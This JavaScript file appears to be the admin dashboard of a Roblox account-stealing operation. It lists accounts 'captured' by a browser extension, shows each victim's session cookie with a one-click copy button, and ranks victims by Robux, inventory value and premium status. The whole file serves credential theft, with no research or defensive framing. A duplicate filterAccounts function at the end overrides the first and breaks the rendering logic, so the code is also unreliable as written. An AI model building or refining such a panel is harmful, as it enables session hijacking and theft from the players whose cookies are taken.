// API Base URL
const API_URL = window.location.origin;

// Load data on page load
document.addEventListener('DOMContentLoaded', () => {
    loadData();
    // Auto refresh every 30 seconds
    setInterval(loadData, 30000);
});

// Load all data
async function loadData() {
    try {
        const response = await fetch(`${API_URL}/api/accounts`);
        const data = await response.json();
        
        if (data.success) {
            renderAccounts(data.accounts);
            updateStats(data.stats);
            loadLogs();
        }
    } catch (error) {
        console.error('Error loading data:', error);
        document.getElementById('accountsGrid').innerHTML = 
            '<div class="loading">❌ Error loading data. Please refresh.</div>';
    }
}

// Render accounts
function renderAccounts(accounts) {
    const grid = document.getElementById('accountsGrid');
    
    if (!accounts || accounts.length === 0) {
        grid.innerHTML = `
            <div class="loading" style="grid-column: 1/-1;">
                📭 No accounts captured yet
                <br><small style="color: #445566;">Waiting for data from extension...</small>
            </div>
        `;
        return;
    }
    
    // Filter and sort
    const filtered = filterAccounts(accounts);
    
    grid.innerHTML = filtered.map(account => `
        <div class="account-card">
            <span class="badge ${account.premium ? 'badge-premium' : 'badge-free'}">
                ${account.premium ? '⭐ PREMIUM' : 'FREE'}
            </span>
            ${account.twoFAEnabled ? '<span class="badge badge-2fa">🔒 2FA</span>' : ''}
            
            <div class="username">${account.displayName || account.username}</div>
            <div class="user-id">🆔 ${account.userId}</div>
            
            <div class="info-grid">
                <div class="info-item">
                    <span class="label">💰 Robux</span>
                    <span class="value">${(account.robux || 0).toLocaleString()} R$</span>
                </div>
                <div class="info-item">
                    <span class="label">👥 Friends</span>
                    <span class="value">${account.friends || 0}</span>
                </div>
                <div class="info-item">
                    <span class="label">📅 Account Age</span>
                    <span class="value">${account.accountAge || 'N/A'}</span>
                </div>
                <div class="info-item">
                    <span class="label">📧 Email</span>
                    <span class="value">${account.emailVerified ? '✅' : '❌'} ${account.email || 'N/A'}</span>
                </div>
                <div class="info-item" style="grid-column: 1/-1;">
                    <span class="label">📦 Inventory Value</span>
                    <span class="value">${(account.inventoryValue || 0).toLocaleString()} R$</span>
                </div>
            </div>
            
            <div class="cookie-box">
                <textarea readonly rows="2">${account.cookie || 'No cookie'}</textarea>
                <button class="copy-btn" onclick="copyCookie('${account.cookie?.replace(/"/g, '&quot;')}')">📋 Copy</button>
            </div>
            
            <div class="actions">
                <button class="btn-profile" onclick="openProfile('${account.userId}')">👤 Profile</button>
                <button class="btn-delete" onclick="deleteAccount('${account.userId}')">🗑️ Delete</button>
            </div>
        </div>
    `).join('');
}

// Filter accounts
function filterAccounts(accounts) {
    const search = document.getElementById('searchInput').value.toLowerCase();
    const premiumFilter = document.getElementById('filterPremium').value;
    const sortBy = document.getElementById('sortBy').value;
    
    let filtered = accounts || [];
    
    // Search
    if (search) {
        filtered = filtered.filter(a => 
            a.username?.toLowerCase().includes(search) ||
            a.displayName?.toLowerCase().includes(search) ||
            a.userId?.includes(search)
        );
    }
    
    // Premium filter
    if (premiumFilter === 'premium') {
        filtered = filtered.filter(a => a.premium === true);
    } else if (premiumFilter === 'free') {
        filtered = filtered.filter(a => a.premium === false);
    }
    
    // Sort
    if (sortBy === 'newest') {
        filtered.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
    } else if (sortBy === 'oldest') {
        filtered.sort((a, b) => new Date(a.createdAt) - new Date(b.createdAt));
    } else if (sortBy === 'robux') {
        filtered.sort((a, b) => (b.robux || 0) - (a.robux || 0));
    }
    
    return filtered;
}

// Update stats
function updateStats(stats) {
    document.getElementById('totalAccounts').textContent = stats?.totalAccounts || 0;
    document.getElementById('totalRobux').textContent = (stats?.totalRobux || 0).toLocaleString();
    
    // Count premium
    fetch(`${API_URL}/api/accounts`)
        .then(res => res.json())
        .then(data => {
            if (data.success) {
                const premium = data.accounts.filter(a => a.premium).length;
                document.getElementById('premiumCount').textContent = premium;
            }
        })
        .catch(() => {});
}

// Load logs
async function loadLogs() {
    try {
        const response = await fetch(`${API_URL}/api/stats`);
        const data = await response.json();
        
        if (data.success && data.recentLogs) {
            const container = document.getElementById('logsContainer');
            container.innerHTML = data.recentLogs.map(log => `
                <div class="log-entry">
                    <span>
                        <span class="log-type ${log.type}">${log.type}</span>
                        ${log.username ? `@${log.username}` : ''}
                        ${log.content ? `: ${log.content.substring(0, 50)}` : ''}
                    </span>
                    <span class="log-time">${new Date(log.timestamp).toLocaleString()}</span>
                </div>
            `).join('');
        }
    } catch (error) {
        console.error('Error loading logs:', error);
    }
}

// Copy cookie
function copyCookie(cookie) {
    if (cookie && cookie !== 'No cookie') {
        navigator.clipboard.writeText(cookie).then(() => {
            alert('✅ Cookie copied to clipboard!');
        }).catch(() => {
            // Fallback
            const textarea = document.createElement('textarea');
            textarea.value = cookie;
            document.body.appendChild(textarea);
            textarea.select();
            document.execCommand('copy');
            document.body.removeChild(textarea);
            alert('✅ Cookie copied!');
        });
    } else {
        alert('❌ No cookie to copy');
    }
}

// Open profile
function openProfile(userId) {
    window.open(`https://www.roblox.com/users/${userId}/profile`, '_blank');
}

// Delete account
async function deleteAccount(userId) {
    if (confirm('⚠️ Are you sure you want to delete this account?')) {
        try {
            const response = await fetch(`${API_URL}/api/account/${userId}`, {
                method: 'DELETE'
            });
            const data = await response.json();
            
            if (data.success) {
                alert('✅ Account deleted successfully');
                loadData();
            } else {
                alert('❌ Failed to delete account');
            }
        } catch (error) {
            alert('❌ Error deleting account');
        }
    }
}

// Refresh function (called from button)
function filterAccounts() {
    loadData();
}